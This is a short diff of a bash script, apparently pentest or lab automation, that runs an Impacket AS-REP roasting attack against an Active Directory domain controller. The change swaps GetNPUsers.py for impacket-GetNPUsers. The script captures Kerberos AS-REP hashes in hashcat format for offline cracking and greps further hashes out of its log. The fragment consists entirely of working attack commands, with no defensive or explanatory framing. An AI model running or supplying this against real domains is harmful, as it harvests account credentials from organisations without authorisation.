@@ -9,7 +9,7 @@ mkdir -p "$OUT"
 
 LOG="$OUT/01-asrep-roast.log"
 echo "[*] Impacket AS-REP roast para ${USER}@${DOMAIN}" | tee "$LOG"
-GetNPUsers.py "${DOMAIN}/${USER}" -no-pass -dc-ip "$DC_IP" \
+impacket-GetNPUsers "${DOMAIN}/${USER}" -no-pass -dc-ip "$DC_IP" \
     -format hashcat -outputfile "$OUT/asrep.hash" 2>&1 | tee -a "$LOG" || true
 
 grep -oE '\$krb5asrep\$[^[:space:]]+' "$LOG" >> "$OUT/asrep.hash" || true
